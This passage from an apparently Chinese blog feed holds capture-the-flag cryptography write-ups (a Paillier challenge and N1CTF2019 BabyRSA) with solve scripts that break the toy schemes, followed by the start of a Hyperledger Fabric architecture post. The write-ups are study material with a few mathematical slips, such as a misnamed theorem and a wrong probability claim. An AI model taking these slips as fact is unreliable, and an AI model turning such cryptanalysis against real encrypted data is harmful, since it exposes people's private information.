flag &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; s2n(flag)
r &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; randint(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, n)
c &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (pow(n &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, flag, n &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; n) &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; pow(r, n, n &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; n)) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; (n &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; n)
print c
&lt;span style=&#34;color:#75715e&#34;&gt;# c = 13134489820394613222282607681686272081419875146946401883172682167011759113388373349180457979897848113275982219264879081189886853062717764580364698888338032141434053832247476010400449272010082460437747190468766740274587999336359171283098137261396013153130265440425676242061845667887640808895666325466803989428&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;思路-1&#34;&gt;思路&lt;/h3&gt;
&lt;p&gt;代码很简单，就是道纯数学题&lt;/p&gt;
&lt;p&gt;由源码：&lt;/p&gt;
&lt;p&gt;$c\equiv (n+1)^f\cdot r^n\ (\mathrm{mod}\ n^2)$&lt;/p&gt;
&lt;p&gt;根据二项式定理：&lt;/p&gt;
&lt;p&gt;$c\equiv (fn+1)\cdot r^n\ (mod\ n^2)$&lt;/p&gt;
&lt;p&gt;左右两式同乘 $\varphi(n)$ 次方，得 $c^{\varphi(n)}\equiv (fn+1)^{\varphi(n)}\cdot r^{n\varphi(n)}\ (mod\ n^2)$&lt;/p&gt;
&lt;p&gt;由 $\varphi(n^2)=n\cdot \varphi(n)$ 且当 $r\neq p$ 或 $r\neq q$ 时有，$gcd(r,n)=1$ 可知，$r^{n\varphi(n)}\equiv 1\ (mod\ n^2)$，可得：&lt;/p&gt;
&lt;p&gt;$c^{\varphi(n)}\equiv (fn+1)^{\varphi(n)}\ (mod\ n^2)$&lt;/p&gt;
&lt;p&gt;因为 r 为随机数，所以 $r\neq p,q$ 的概率为 $\dfrac{2}{n}$，可认为 $gcd(r,n)=1$ 成立。&lt;/p&gt;
&lt;p&gt;再次使用二次项定理，可得 $c^{\varphi(n)}\equiv fn\varphi(n)+1\ (mod\ n^2)$&lt;/p&gt;
&lt;p&gt;由费曼小定理可知 $c^{\varphi(n)}\equiv 1\ (mod\ n)$，即 $n|c^{\varphi(n)}-1$，因此将1移到同余式左边并对同余式同除n，得：&lt;/p&gt;
&lt;p&gt;$\dfrac{c^{\varphi(n)}-1}{n}\equiv f\varphi(n)\ (mod\ n)$&lt;/p&gt;
&lt;p&gt;对于左式，设 $\dfrac{c^{\varphi(n)}-1}{n}=kn+r&#39;$&lt;/p&gt;
&lt;p&gt;$c^{\varphi(n)}=kn^2+rn+1$&lt;/p&gt;
&lt;p&gt;只需求解出 $rn+1$ 即可，因此可以对 $c^{\varphi(n)}$ 进行模 $n^2$，实现时可直接使用 python 中的 pow 函数。&lt;/p&gt;
&lt;p&gt;将左式求解后，化为求解 $\varphi(n)\cdot f\equiv r&#39;\ (mod\ n)$，即 $f\equiv \varphi(n)^{-1}\cdot r&#39;\ (mod\ n)$&lt;/p&gt;
&lt;h3 id=&#34;代码&#34;&gt;代码&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; AITMCLab.libnum &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; s2n, invmod, n2s

c &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;131344898203946132222826076816862720814198751469464018831726821670&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;117591133883733491804579798978481132759822192648790811898868530627&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;177645803646988883380321414340538322474760104004492720100824604377&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;471904687667402745879993363591712830981372613960131531302654404256&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;76242061845667887640808895666325466803989428&lt;/span&gt;
p &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;104879397075344024438671231239628115011303349344697797964879592144&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;922079000957&lt;/span&gt; 
q &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;104879397075344024438671231239628115011303349344697797964879592144&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;922079001013&lt;/span&gt;
phi_n &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (p &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; (q &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)
n &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; q
r &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (pow(c, phi_n, n &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; n) &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;//&lt;/span&gt; n
print n2s(r &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; invmod(phi_n, n) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; n)
&lt;span style=&#34;color:#75715e&#34;&gt;# flag{can_you_find_me??}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;总结&#34;&gt;总结&lt;/h3&gt;
&lt;p&gt;纯数学题&lt;/p&gt;
&lt;p&gt;学长带着推了一遍。。。这也太难了。。。&lt;/p&gt;
&lt;p&gt;听说是 paillier 加密，果然是 not RSA&lt;/p&gt;
&lt;h2 id=&#34;n1ctf2019babyrsa&#34;&gt;[N1CTF2019]BabyRSA&lt;/h2&gt;
&lt;h3 id=&#34;题目-1&#34;&gt;题目&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; Crypto.Util &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; number
&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; random
&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; secret &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; flag
N &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;23981306327188221819291352455300124608114670714977979223022816906368788909398653961976023086718129607035805397846230124785550919468973090809881210560931396002918119995710297723411794214888622784232065592366390586879306041418300835178522354945438521139847806375923379136235993890801176301812907708937658277646761892297209069757559519399120988948212988924583632878840216559421398253025960456164998680766732013248599742397199862820924441357624187811402515396393385081892966284318521068948266144251848088067639941653475035145362236917008153460707675427945577597137822575880268720238301307972813226576071488632898694390629&lt;/span&gt;
e &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x10001&lt;/span&gt;
m &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; number&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;bytes_to_long(flag)
&lt;span style=&#34;color:#66d9ef&#34;&gt;with&lt;/span&gt; open(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;flag.enc&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;w&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;as&lt;/span&gt; f:
    &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; m:
        padding &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; random&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;randint(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1000&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
        message &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; padding &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; m &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
        cipher &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; pow(message, e, N)
        f&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(hex(cipher)&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;n&amp;#39;&lt;/span&gt;)
        m &lt;span style=&#34;color:#f92672&#34;&gt;/=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;思路-2&#34;&gt;思路&lt;/h3&gt;
&lt;p&gt;首先阅读代码。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; m:
    &lt;span style=&#34;color:#75715e&#34;&gt;# several operations&lt;/span&gt;
    m &lt;span style=&#34;color:#f92672&#34;&gt;/=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;由上述代码部分以及过程中出现了 &lt;code&gt;m % 2&lt;/code&gt; 操作可知，flag 的二进制数据每一位被存进了 &lt;code&gt;key.enc&lt;/code&gt; 文件的每行数据中，因此对 &lt;code&gt;key.enc&lt;/code&gt; 文件的每一行进行读取，只要能够判断该位为0还是1，即可完成解密。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;padding &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; random&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;randint(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1000&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
message &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; padding &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; pow(m, p &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, p) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; m &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
cipher &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; pow(message, e, N)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;由上述代码可知，$c\equiv m^e\ (\mathrm{mod}\ N), m = r^2\cdot 2^{1+flag%2}$ （r为random结果），因此 &lt;code&gt;m % 2 = 1&lt;/code&gt; 时，有$c\equiv r^2\cdot 2^2\equiv (2^er^e)^2\ (\mathrm{mod}\ N)$，而 &lt;code&gt;m % 2 = 0&lt;/code&gt; 时，有$c\equiv 2^e\cdot r^{2^e}$。&lt;/p&gt;
&lt;p&gt;首先猜测可以通过破解RSA密码，将加密信息还原为明文信息，判断该数整除 2 的奇数次方还是偶数次方即可得知该位的二进制数。使用 factordb 网站失败后贼心不死，又尝试了网上找的多种攻击脚本，发现均无法分解，于是寻找其它方法。&lt;/p&gt;
&lt;p&gt;观察&lt;del&gt;README.md&lt;/del&gt;发现，本题可以尝试用二次剩余求解。&lt;code&gt;m % 2 = 1&lt;/code&gt; 时，有 $c\equiv (2^er^e)^2\ (\mathrm{mod}\ N)$，&lt;code&gt;m%  2 = 0&lt;/code&gt; 时，有 $c\equiv (2\cdot r^2)^e\ (\mathrm{mod}\ N)$，因此，当 c 为 N 的二次剩余时，对应&lt;code&gt;m % 2 = 1&lt;/code&gt;，c 为 N 的二次非剩余时，对应 &lt;code&gt;m % 2 = 0&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;可以使用 Jacobi 判断是否为二次剩余。只需满足 $\left(\dfrac{2^e\cdot r^{2^e}}{N}\right)=-1$ 即可求解。由于 $\left(\dfrac{2^e\cdot r^{2^e}}{N}\right)=\left(\dfrac{2}{p}\right)\left(\dfrac{2}{q}\right)$，所以当 &lt;code&gt;m % 2 = 0&lt;/code&gt; 时，Jacobi 计算结果仅取决于 p 和 q，且在实际计算中发现存在 Jacobi 计算结果为 -1 的情况，又因为 &lt;code&gt;m % 2 = 1&lt;/code&gt; 时 Jacobi 计算结果必然为 1，说明本题中 2 分别是 p 和 q 的二次剩余和二次非剩余，可得&lt;/p&gt;
&lt;p&gt;当 $m\equiv 0\pmod 2$，$\left(\dfrac{c}{N}\right)= \left(\dfrac{2}{p}\right)\left(\dfrac{2}{q}\right)=-1$&lt;/p&gt;
&lt;p&gt;当 $m\equiv 1\pmod 2$，$\left(\dfrac{c}{N}\right)= 1$&lt;/p&gt;
&lt;p&gt;因此可以用 Jacobi 来计算 flag 的二进制结果。&lt;/p&gt;
&lt;h3 id=&#34;exp-1&#34;&gt;exp&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; AITMCLab.Crypto.Util.number &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; long_to_bytes

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;jacobi&lt;/span&gt;(a, b):
    res &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; a &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;:
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt; ((b &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; b &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; a &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; b &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;:
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt; ((b &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; a &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;:
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; a &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;:
        res &lt;span style=&#34;color:#f92672&#34;&gt;*=&lt;/span&gt; jacobi(&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, b)
        a &lt;span style=&#34;color:#f92672&#34;&gt;/=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
    res &lt;span style=&#34;color:#f92672&#34;&gt;*=&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;((a &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; (b &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; jacobi(b &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; a, a)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; res

n &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;23981306327188221819291352455300124608114670714977979223022816906368788909398653961976023086718129607035805397846230124785550919468973090809881210560931396002918119995710297723411794214888622784232065592366390586879306041418300835178522354945438521139847806375923379136235993890801176301812907708937658277646761892297209069757559519399120988948212988924583632878840216559421398253025960456164998680766732013248599742397199862820924441357624187811402515396393385081892966284318521068948266144251848088067639941653475035145362236917008153460707675427945577597137822575880268720238301307972813226576071488632898694390629&lt;/span&gt;
flag &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;with&lt;/span&gt; open(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;key.enc&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;r&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;as&lt;/span&gt; f:
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; line &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; f:
        line &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; line&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;strip(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;L&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)    &lt;span style=&#34;color:#75715e&#34;&gt;# Filter out &amp;#34;L\n&amp;#34; at the end of line&lt;/span&gt;
        cur &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; int(line, &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;)         &lt;span style=&#34;color:#75715e&#34;&gt;# Convert hax string to number&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (jacobi(cur, n) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;):
            flag &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; i
        i &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
        print flag

print flag
print long_to_bytes(flag)

&lt;span style=&#34;color:#75715e&#34;&gt;# N1CTF{You_can_leak_the_jacobi_symbol_from_RSA}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;首先从&lt;code&gt;key.enc&lt;/code&gt;中逐行读取，并对每一行结尾的&amp;rsquo;L\n&amp;rsquo;进行过滤，将其转换为整数cur后，计算Jacobi符号$J\left( cur, N\right)$。计算Jacobi符号时主要使用二次互反律进行计算（可以再使用其它定律进行加速，但没必要）。&lt;/p&gt;
&lt;p&gt;由于第一行储存的为flag的最后一位（即从后往前储存），因此进行&lt;code&gt;flag += 1 &amp;lt;&amp;lt; i&lt;/code&gt;即可将相应位置的二进制结果还原。&lt;/p&gt;
&lt;h3 id=&#34;总结-1&#34;&gt;总结&lt;/h3&gt;
&lt;p&gt;这道题在代码阅读上难度较低，唯一需要留意的地方就是&lt;code&gt;padding &amp;lt;&amp;lt; pow(m, p - 1, p) + m % 2&lt;/code&gt;这个运算的优先级问题（感谢bg的注释提示）。把代码转换成数学公式后，二次剩余的方法就比较明显了，需要注意的是&lt;code&gt;Jacobi&lt;/code&gt;符号无法准确判断二次剩余与二次非剩余（感谢bg指出了这个问题），简单推导后发现这个方法有一定的使用条件，如果题目中的p和q不满足一定的条件，这个方法就无法正确区分0和1。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;后经 ssgss 师傅提醒发现这道题用的是 Goldwasser-Micali 密码（上课走神实锤了）。简单对比发现，当GM密码选取的x满足 &lt;code&gt;J(x, p) = 1&lt;/code&gt; 且 &lt;code&gt;J(x, q) = -1&lt;/code&gt; 时，可能能够利用本题的方法进行破解。因此选取的 x 不能仅满足是 n 的二次非剩余，需要同时是 p 和 q 的二次非剩余。&lt;/p&gt;
&lt;/blockquote&gt;
</description>
        </item>
        <item>
        <title>Fabric-Architecture-and-SystemChaincode</title>
        <link>/post/fabric-architecture-and-systemchaincode/</link>
        <pubDate>Tue, 08 Dec 2020 01:33:07 +0000</pubDate>
        
        <guid>/post/fabric-architecture-and-systemchaincode/</guid>
        <description>&lt;p&gt;参考文献：&lt;a class=&#34;link&#34; href=&#34;1801.10228.pdf&#34; &gt;Hyperledger Fabric: A Distributed Operation System for Permissioned Blockchains&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;架构&#34;&gt;架构&lt;/h2&gt;
&lt;h3 id=&#34;整体结构&#34;&gt;整体结构&lt;/h3&gt;
&lt;p&gt;Fabric是一个许可区块链的分布式操作系统，可以执行多种编程语言编写的分布式应用。它能够在一个只能追加的数据结构中安全地跟踪执行历史，并且没有内置的加密账本。&lt;/p&gt;
&lt;p&gt;Fabric使用了“执行-order-验证”的区块链架构，而没有遵顼标准的“order-执行”设计。其整体的分布式应用可以分为两个部分&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;智能合约，称为链码 (&lt;em&gt;Chaincode&lt;/em&gt;) ，是一段实现了应用逻辑的程序代码，并在执行过程中运行。链码是Fabric分布式应用的核心部分，可能会被未受信任的开发者修改。有一种特殊的链码被用于管理区块链系统并维护参数，被称为系统链码 (&lt;em&gt;system chaincode&lt;/em&gt;)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;背书政策 (&lt;em&gt;endorsement policy&lt;/em&gt;) 在验证阶段进行评价。许可政策无法被未受信任的开发者选择或修改。其在区块链中充当一个用于事物验证的静态库，且只能通过链码进行参数化。只有指定的管理员有权限使用系统管理功能修改。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;“执行-排序-验证”结构示意图：&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 302; 
			flex-basis: 726px&#34;
	&gt;
	&lt;a href=&#34;/post/fabric-architecture-and-systemchaincode/execute-order-validate.png&#34; data-size=&#34;521x172&#34;&gt;
		&lt;img src=&#34;/post/fabric-architecture-and-systemchaincode/execute-order-validate.png&#34;
			width=&#34;521&#34;
			height=&#34;172&#34;
			srcset=&#34;/post/fabric-architecture-and-systemchaincode/execute-order-validate_hua21294e0010315c77e929f3912be8b3a_23641_480x0_resize_box_3.png 480w, /post/fabric-architecture-and-systemchaincode/execute-order-validate_hua21294e0010315c77e929f3912be8b3a_23641_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;一个客户端向背书政策指定的peer节点(peers)发送交易。这个交易被特殊的peer节点执行并且记录输出信息，这一步骤被称为背书。执行完成后，交易进入了排序(ordering)阶段，在这一个阶段中，使用了一种可插入的共识协议来产生一个完成排序的已背书交易的序列，并按区块分组。这些交易被广播到所有的节点。这个序列的顺序由输出和状态的依赖性决定。在验证阶段，每个peer节点都需要根据背书政策和执行的一致性对已背书交易的状态变化进行验证。所有peer节点都已相同的顺序进行验证，因此结果具有确定性。&lt;/p&gt;
&lt;p&gt;Fabric网络支持多个区块链链接到同一个排序服务上。每个区块链被称为一个通道(&lt;em&gt;Channel&lt;/em&gt;)，可以有不同的peer节点作为其成员。这些通道可以被用来分离不同的区块链之间的状态，但每个通道的共识并不一致，并且通道中的交易顺序是相互分开的。认为所有排序都是可信的部署，可以通过通道访问控制来实现对节点的控制。&lt;/p&gt;
&lt;p&gt;其中的节点可分为：客户端、peer节点（其中一部分为背书节点）、排序服务节点(OSN, &lt;em&gt;Ordering Service Nodes&lt;/em&gt; or &lt;em&gt;orderers&lt;/em&gt;)&lt;/p&gt;
&lt;h3 id=&#34;交易的三个阶段&#34;&gt;交易的三个阶段&lt;/h3&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 176; 
			flex-basis: 423px&#34;
	&gt;
	&lt;a href=&#34;/post/fabric-architecture-and-systemchaincode/transaction_flow.png&#34; data-size=&#34;654x371&#34;&gt;
		&lt;img src=&#34;/post/fabric-architecture-and-systemchaincode/transaction_flow.png&#34;
			width=&#34;654&#34;
			height=&#34;371&#34;
